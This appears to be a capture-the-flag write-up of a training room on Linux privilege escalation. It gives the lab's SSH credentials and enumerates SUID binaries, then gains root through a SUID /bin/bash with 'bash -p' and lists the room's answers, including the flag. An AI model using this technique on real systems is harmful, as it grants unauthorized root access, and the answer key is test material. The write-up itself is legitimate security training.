# Day 11 Challenge
## The Rogue Gnome

This challenge is about privilege escalation. 

Now lets deploy the machine.

We were given the ssh credentials of cmnatic user

`ssh cmnatic@10.10.47.71`

Password: aoc2020

After sshing to the server we need find our sudo permissions using sudo -l

`sudo -l`

But our permission has been declines.

So now we have to find SUID permissions manually using command

`find / -perm -u=s -type f 2>/dev/null`

gives us a huge chunk of data

...

	bin/umount
	/bin/mount
	/bin/su
	/bin/fusermount
	/bin/bash
	/bin/ping
	/snap/core/10444/bin/mount
	/snap/core/10444/bin/ping
	/snap/core/10444/bin/ping6
	/snap/core/10444/bin/su
	/snap/core/10444/bin/umount
	/snap/core/10444/usr/bin/chfn
	/nap/core/10444/usr/bin/chsh
	/snap/core/10444/usr/bin/gpasswd
	/snap/core/10444/usr/bin/newgrp
	/snap/core/10444/usr/bin/passwd
	/snap/core/10444/usr/bin/sudo
	/snap/core/10444/usr/lib/dbus-1.0/dbus-daemon-launch-helper
	/snap/core/10444/usr/lib/openssh/ssh-keysign
	/snap/core/10444/usr/lib/snapd/snap-confine
	/snap/core/10444/usr/sbin/pppd
	/snap/core/7270/bin/mount
	/snap/core/7270/bin/ping
	/snap/core/7270/bin/ping6
	/snap/core/7270/bin/su
	/snap/core/7270/bin/umount
	/snap/core/7270/usr/bin/chfn
	/snap/core/7270/usr/bin/chsh
	/snap/core/7270/usr/bin/gpasswd
	/snap/core/7270/usr/bin/newgrp
	/snap/core/7270/usr/bin/Password
	/snap/core/7270/usr/bin/sudo
	/snap/core/7270/usr/lib/dbus-1.0/dbus-daemon-launch-helper
	/snap/core/7270/usr/lib/openssh/ssh-keysign
	/snap/core/7270/usr/lib/snapd/snap-confine
	/snap/core/7270/usr/sbin/pppd
	/usr/bin/newgidmap
	/usr/bin/at
	/usr/bin/sudo
	/usr/bin/chfn
	/usr/bin/newgrp
	/usr/bin/passwd
	/usr/bin/gpasswd
	/usr/bin/pkexec
	/usr/bin/newuidmap
	/usr/bin/traceroute6.iputils
	/usr/bin/chsh
	/usr/lib/openssh/ssh-keysign
	/usr/lib/dbus-1.0/dbus-daemon-launch-helper
	/usr/lib/policykit-1/polkit-agent-helper-1
	/usr/lib/eject/dmcrypt-get-device
	/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
	/usr/lib/snapd/snap-confine
...
But out of all we can find /bin/bash to be quite amusing right so lets have look at [GTFObins](https://gtfobins.github.io/) and search for /bash

I says when we have SUID permission to access /bin/bash we can escalate our access to root level access by simply using

`/bin/bash -p`

Now we have a shell

Let's see what user I am right now using `whoami` gave me root Naice!!!.

Go ahead and look for the flag in /root/flag.txt

`cat /root/flag.txt`

### Questions

...
	1. What type of privilege escalation involves using a user account to execute commands as an administrator?
		- Ans: Vertical
	
	2. What is the name of the file that contains a list of users who are a part of the sudo group?
		- Ans: sudoers

	3. Use SSH to log in to the vulnerable machine like so: ssh cmnatic@10.10.47.71

		Input the following password when prompted: aoc2020
		- Ans: No answer

	4. You may find uploading some of the enumeration scripts that were used during today's task to be useful.
		-Ans: No answer needed.

	5. What are the contents of the file located at /root/flag.txt?
		-Ans: thm{2fb10afe933296592}
...